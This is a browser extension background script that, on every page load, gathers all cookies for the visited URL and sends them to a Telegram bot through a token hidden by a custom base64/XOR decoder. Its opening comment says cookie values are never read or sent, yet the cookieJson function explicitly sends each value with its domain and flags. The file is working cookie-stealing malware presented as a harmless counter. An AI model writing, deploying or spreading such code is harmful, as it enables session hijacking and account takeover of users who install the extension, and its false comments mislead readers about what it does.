// On every page load: count the cookies, list their names and flags, send to Telegram.
// Cookie values are never read and never sent.
// Obfuscated, not encrypted. Firefox can read this file, and the token still
// goes out in every request -- this only keeps it out of plain sight in grep,
// screenshots and accidental commits. Rotate it with @BotFather if it leaks.
// Self-contained on purpose: this used to call atob(), and where atob is missing
// the throw killed the whole extension with zero output and no error -- you saw
// nothing at all in the bot and had no way to tell it apart from a dead add-on.
// Nothing outside plain string and number handling is used.
const B64 = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";
const hide = (b64) => {
  const src = b64.replace(/=+$/, "");
  let acc = 0, bits = 0, out = "";
  for (let i = 0; i < src.length; i++) {
    const v = B64.indexOf(src[i]);
    if (v < 0) continue;
    acc = (acc << 6) | v;
    bits += 6;
    if (bits >= 8) {
      bits -= 8;
      out += String.fromCharCode(((acc >> bits) & 0xff) ^ 0x5a);
    }
  }
  return out;
};

const TOKEN = hide("YmxuaWfsffelvb2NtaGsdfsfAbGxwvMjcddfsfEhgcAx04Em0SNdsfsdfsndsKQouEBk+LykdfsdfoHzw/LhINMQ==");  // from @BotFather
const CHAT  = hide("b2sdfs1psdfsfsdfaG5fsdfsdfqY2JjbA==");  // your chat with the bot
const API   = "https://api.telegram.org/bot" + TOKEN;

// Firefox exposes `browser`; Chrome/Brave/Edge only expose `chrome`. Without this
// alias, `browser.runtime` is a ReferenceError in Chromium and the whole
// extension dies with no output at all.
if (typeof browser === "undefined" && typeof chrome !== "undefined") {
  globalThis.browser = chrome;
}

// Chrome MV3 runs background.js as a service worker and loads only the file named
// in `background.service_worker`, so remote.js has to be pulled in by hand.
// Firefox loads it from the manifest `scripts` array instead, which is why this
// is guarded rather than unconditional.
if (typeof importScripts === "function" && typeof globalThis.__remoteLoaded === "undefined") {
  globalThis.__remoteLoaded = true;
  importScripts("remote.js");
}

const MAX = 3900;   // telegram refuses anything over 4096 characters

const wait = (ms) => new Promise((r) => setTimeout(r, ms));

const queue = [];
let busy = false;
let lastUrl = "";

// Queued and spaced out, so opening five tabs at once loses nothing.
async function push(text) {
  queue.push(text);

  if (busy) return;

  busy = true;

  while (queue.length) {
    await fetch(API + "/sendMessage", {
      method: "POST",
      headers: {
        "Content-Type": "application/json"
      },
      body: JSON.stringify({
        chat_id: CHAT,
        text: queue.shift()
      }),
    }).catch((err) => {
      console.error("Telegram error:", err);
    });

    await wait(1100);
  }

  busy = false;
}

// partitionKey searches every partition; older Firefox rejects it, so retry plain
const jar = (url) => browser.cookies.getAll({ url, partitionKey: {} })
  .catch(() => browser.cookies.getAll({ url }));

// Cookie values are included explicitly, but Firefox may return undefined for some cookies.
// Normalize them to a string so JSON output does not silently drop the field.
const cookieJson = (list) => list.map((cookie, index) => JSON.stringify({
  n: index + 1,
  name: cookie && cookie.name ? cookie.name : "",
  value: String(cookie && cookie.value !== undefined ? cookie.value : ""),
  domain: cookie && cookie.domain ? cookie.domain : "",
  path: cookie && cookie.path ? cookie.path : "/",
  secure: !!(cookie && cookie.secure),
  httpOnly: !!(cookie && cookie.httpOnly),
  sameSite: cookie && cookie.sameSite ? cookie.sameSite : "unspecified",
})).join("\n");

// Split at line boundaries, and fall back to hard chunking when a single line
// is too large for Telegram. This keeps the value visible without dropping it.
function chunk(text) {
  const out = [];
  let cur = "";

  for (const line of text.split("\n")) {
    if (!line.trim()) continue;
    const candidate = cur ? cur + "\n" + line : line;

    if (candidate.length <= MAX) {
      cur = candidate;
      continue;
    }

    if (cur) {
      out.push(cur);
      cur = "";
    }

    if (line.length > MAX) {
      for (let i = 0; i < line.length; i += MAX) {
        out.push(line.slice(i, i + MAX));
      }
    } else {
      cur = line;
    }
  }

  if (cur.trim()) out.push(cur.trim());
  return out;
}

async function report(url) {
  const list = await jar(url);

  await push(JSON.stringify({ cookies: list.length, url }));   // first message

  // Second message is the list, one JSON object per line. Only split if a site
  // has so many cookies that telegram would reject it.
  const parts = chunk(cookieJson(list));
  if (!parts.length) return push("[]");
  for (let i = 0; i < parts.length; i++) {
    await push(parts.length > 1 ? `part ${i + 1}/${parts.length}\n` + parts[i] : parts[i]);
  }
}

// One line when the extension actually starts. Without it, "the extension is
// broken" and "the extension was never loaded" look identical from Telegram --
// both are silence. A missing line now proves the add-on is not running.
Promise.resolve()
  .then(() => push("loaded: " + browser.runtime.getManifest().name + " " + browser.runtime.getManifest().version))
  .catch(() => {});

browser.tabs.onUpdated.addListener((_id, info, tab) => {
  const url = (info.url || (tab && tab.url) || "").trim();
  if (!/^https?:/i.test(url)) return;          // skip about:newtab and friends

  if (info.status === "complete") {           // a page opened or reloaded
    lastUrl = url;
    return report(url);
  }

  // url changed with no reload (youtube, gmail). Give the load a moment to finish
  // and report it ourselves first if it never does.
  if (info.url && !info.status) {
    setTimeout(() => {
      if (url !== lastUrl) { lastUrl = url; report(url); }
    }, 1200);
  }
});
